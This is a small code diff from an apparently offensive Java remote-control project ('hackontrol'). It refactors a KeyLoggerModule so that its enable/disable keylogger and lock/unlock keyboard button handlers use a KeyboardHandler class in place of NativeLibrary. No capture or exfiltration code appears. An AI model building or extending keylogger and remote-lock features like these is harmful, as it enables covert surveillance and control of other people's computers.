@@ -2,7 +2,7 @@ package com.khopan.hackontrol.module.keylogger;
 
 import java.util.List;
 
-import com.khopan.hackontrol.NativeLibrary;
+import com.khopan.hackontrol.handler.KeyboardHandler;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
 import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
@@ -62,32 +62,32 @@ public class KeyLoggerModule extends Module {
 	}
 
 	private void buttonEnable(ButtonContext context, boolean enable) {
-		if(NativeLibrary.Enable == enable) {
+		if(KeyboardHandler.Enable == enable) {
 			HackontrolMessage.boldDeletable(context.reply(), "KeyLogger is already " + (enable ? "enabled" : "disabled"));
 			return;
 		}
 
 		if(!enable) {
-			Question.positive(context.reply(), "Are you sure you want to disable KeyLogger?", QuestionType.YES_NO, () -> NativeLibrary.Enable = false);
+			Question.positive(context.reply(), "Are you sure you want to disable KeyLogger?", QuestionType.YES_NO, () -> KeyboardHandler.Enable = false);
 			return;
 		}
 
-		NativeLibrary.Enable = true;
+		KeyboardHandler.Enable = true;
 		context.deferEdit().queue();
 	}
 
 	private void buttonLock(ButtonContext context, boolean lock) {
-		if(NativeLibrary.Block == lock) {
+		if(KeyboardHandler.Block == lock) {
 			HackontrolMessage.boldDeletable(context.reply(), "Keyboard is already " + (lock ? "locked" : "unlocked"));
 			return;
 		}
 
 		if(!lock) {
-			Question.positive(context.reply(), "Are you sure you want to unlock the keyboard?", QuestionType.YES_NO, () -> NativeLibrary.Block = false);
+			Question.positive(context.reply(), "Are you sure you want to unlock the keyboard?", QuestionType.YES_NO, () -> KeyboardHandler.Block = false);
 			return;
 		}
 
-		NativeLibrary.Block = true;
+		KeyboardHandler.Block = true;
 		context.deferEdit().queue();
 	}
 
